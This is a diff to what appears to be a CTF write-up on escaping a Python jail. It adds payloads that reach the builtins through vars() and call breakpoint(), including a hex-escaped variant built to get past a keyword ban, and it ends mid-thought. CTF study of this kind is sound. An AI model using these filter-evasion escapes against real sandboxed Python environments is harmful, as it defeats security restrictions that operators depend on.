@@ -86,10 +86,21 @@ use this syntax to know what is builtins function
 
 <img src='img/10.png' width='1000px'>
 
-__breakpoint()__ is one of builtins function, so, lets call it
+__breakpoint()__ is one of builtins function, so, lets call it but change it to hex, cuz we now its still __LITE Ban__ appear
 
 ```
 vars(vars()[[x for x in vars()][6]])['breakpoint']()
+vars(vars()[[x for x in vars()][6]])['br\x65akpo\x69n\x74']()
 ```
 
+this is the original payload from the vid
 
+```
+vars(vars()[[x for x in vars()][6]])[[y for y in vars(vars()[[x for x in vars()][6]])][12]]()
+```
+
+i takes so long time to make it by myself, huhh
+
+<img src='img/11.png' width='800px'>
+
+u know what
